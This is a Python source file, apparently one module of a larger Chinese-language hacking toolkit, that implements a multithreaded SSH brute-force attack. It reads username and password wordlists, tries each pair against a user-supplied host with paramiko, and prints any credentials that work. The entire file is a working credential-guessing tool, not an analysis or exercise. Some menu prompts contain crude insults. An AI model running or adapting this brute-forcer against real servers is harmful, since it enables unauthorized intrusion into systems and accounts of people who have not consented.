# Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the thearding: 4
import paramiko
import IGM,os
import concurrent.futures 
import socket,threading
class SSH_bp:
    def __init__(self) -> None:
        self.success = False
        self.futures=[]
        self.lock=threading.Lock
    def ssh_options(self):   #ip和端口设置
        self.host="127.0.0.1"
        self.port=22
        self.host1 = input("输入SSH主机地址(默认为127.0.0.1) or 返回菜单（输入'exit'即可）:")
        if self.host1.lower() == 'exit':
            IGM.main()
        elif self.host1 == "":
            self.host1 = self.host
        else:
            self.host1=self.host1
        self.port1 = input("输入SSH端口号(默认为22) or 返回上一个选项框（输入'exit'即可）:")
        if self.port1.lower() == 'exit':
            self.ssh_options()
        elif self.port1 == "":
            self.port1 = self.port
        else:
            self.port1 = self.port1
        
    def ssh_username(self):      #ssh用户字典选择
        self.username = input("\033[32m请选择SSH用户名字典路径\033[0m\n1) 列出可使用的工具自带字典\n2) 自定义字典路径\n3) 重新选择\n4) 退出该功能模块\n请选择： ")
        if self.username == '1':
            username_list = os.listdir("./Dict/Username")
            array = []     #定义一个列表
            index = 0      #用于统计字典数量的值，从0开始计数
            for item in username_list:
                array.append(item)
                print(index, ":", item)
                index += 1           
            index = input("选择一个用户名字典 or 返回上一个选项框(输入'exit'即可)：")
            if index.lower() == 'exit':
                print("\033[31m返回成功\033[0m")
                self.ssh_username()
            elif index == '':
                print("\033[31m请输入正确的选项！！！\033[0m")
                self.ssh_username()
            else:        #如何把输入的值对应为index的递增值，也就是为1时，拿去1的文件路径
                a=int(index)
                self.username_path = array[a]    
                print(f"您选用了{self.username_path}字典")
                with open(f'./Dict/Username/{self.username_path}') as usernames_file:  
                        self.usernames = usernames_file.readlines() 

        elif self.username == '2':
            while True:
                self.username_path = input("用户名字典文件路径(绝对路径) or 返回上一个选项框(输入'exit'即可):")
                if self.username_path.lower() == 'exit':
                    print("\033[31m返回成功\033[0m")
                    self.ssh_username()
                elif os.path.isfile(self.username_path):  
                    print(f"您选用了{self.username_path}字典")
                    with open(self.username_path) as usernames_file:  
                        self.usernames = usernames_file.readlines() 
                    break 
                else:    
                    print(f"\033[31m文件路径不正确或文件不存在，请重新输入！！！\033[0m")
        elif self.username == '3':
            print("\033[32m返回成功\033[0m")
            self.ssh_options()
        elif self.username == '4':
            IGM.main()
        else:
            print("\033[31m请输入选项！！！\033[0m")
            self.ssh_username()

    def ssh_pass(self):     #ssh密码字典选择
        selection2 = input("\033[32m输入SSH密码字典路径\033[0m\n1) 列出可使用的工具自带字典\n2) 自定义字典路径\n3) 返回上一个选项框\n4) 退出该功能模块\n请选择：")
        if selection2 == '1':
            pass_list = os.listdir("./Dict/Password")
            array = []
            index = 0
            for item in pass_list:
                array.append(item)
                print(index, ":", item)
                index += 1
            index = input("选择一个密码字典 or 返回上一个选项框（输入'exit'即可）:")
            if index.lower() == 'exit':
                print("\033[32m返回成功\033[0m")
                self.ssh_username()
            elif index == index:
                a=int(index)
                self.password_path = array[a]
                print(f"您选用了{self.password_path}字典\n开始爆破......")
                with open(f'./Dict/Password/{self.password_path}') as passwords_file:   
                        self.passwords = passwords_file.readlines()
            else:
                print("你个靓仔，屌你，别瞎jb选！！！")
                self.ssh_pass()
        elif selection2 == '2': 
            while True:
                self.password_path = input("密码字典文件路径(绝对路径):")
                if os.path.isfile(self.password_path):  
                    print(f"您选用了{self.password_path}字典\n开始爆破......")
                    with open(self.password_path) as passwords_file:   
                        self.passwords = passwords_file.readlines()  
                    break 
                else:    
                    print(f"文件路径不正确或文件不存在: {self.password_path}")
        elif selection2 == '3':
            print("\033[32m返回成功\033[0m")
            self.ssh_username()
        elif selection2 == '4':
            IGM.main() 
        elif selection2 == '':
            print("\033[31m输入格式有问题，请重新选择！\033[31m")
            self.ssh_pass()
        else:    
            print("\033[31m干！林北提示了一遍还瞎jb按是吧！！！\033[0m")
            self.ssh_pass()

    def ssh_burp(self,username,password):
        try:
            client = paramiko.SSHClient()  
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=self.host1, port=self.port1, username=username, password=password,timeout=20)
        except socket.timeout:
            print(f"\033[32m无法连接到主机{self.host}，连接超时！\033[0m")
            return
        except paramiko.AuthenticationException:  
            print(f"\033[31m用户名或密码错误: {username}/{password}\033[0m")
            with self.lock:
                return
        except paramiko.SSHException as ex:  
            print(f"\033[31m连接错误: 继续测试...\033[0m")
            return               
        except KeyboardInterrupt:  # 捕获用户中断（如Ctrl+C）  
            print("\n\033[31m用户中断查询。\033[0m")
            IGM.main()  
        # except Exception as e:  
        #     print(f"\033[31m用户名或密码错误: {username}/{password}\033[0m")
        self.success = True
        print(f"\033[32m爆破成功!!! IP地址:{self.host1}:{self.port} 用户名:{username} 密码:{password}\033[0m\n\033[31mCTRL+C\033[0m\033[32m后返回菜单\033[0m")
        for future in self.futures:
            future.cancel()  
    
    def run_all(self):
        self.ssh_options()
        self.ssh_username()
        self.ssh_pass()
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
                for username in self.usernames:
                    username = username.strip()
                    for password in self.passwords:
                        password = password.strip()
                        try:
                            future=executor.submit(self.ssh_burp, username, password)
                            self.futures.append(future)
                        except Exception:
                            pass
        except Exception:
            pass
        
    